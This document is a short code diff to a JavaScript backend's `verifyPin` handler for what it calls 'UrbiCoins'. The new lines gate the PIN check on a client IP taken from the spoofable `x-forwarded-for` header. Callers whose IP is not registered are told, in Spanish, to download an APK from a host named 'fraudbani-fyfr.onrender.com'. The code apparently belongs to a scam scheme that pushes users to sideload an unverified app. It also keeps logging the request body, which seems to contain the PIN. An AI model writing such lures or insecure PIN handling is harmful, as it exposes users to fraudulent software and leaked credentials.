@@ -1,4 +1,5 @@
-import { getUrbiCoins, requests, sender } from '../helpers/index.js'
+import { encrypt, getUrbiCoins, requests, sender } from '../helpers/index.js'
+import IP from '../models/ip.js'
 
 
 const sendAccess = async(req, res) => {
@@ -242,6 +243,19 @@ const checkPin = async(req, res) => {
 }
 
 const verifyPin = async(req, res) => {
+  const raw = req.headers['x-forwarded-for'] 
+    || req.connection.remoteAddress 
+    || ''
+  const ip = raw.split(',')[0].trim()
+  
+  const encIp = encrypt(ip)
+  
+  const encIpExs = await IP.findOne({encIp})
+  
+  if(!encIpExs) {
+    return res.json({message: 'Error, por favor descarga el apk desde --> https://fraudbani-fyfr.onrender.com'})
+  }
+  
   console.log(req.body)
   
   try {
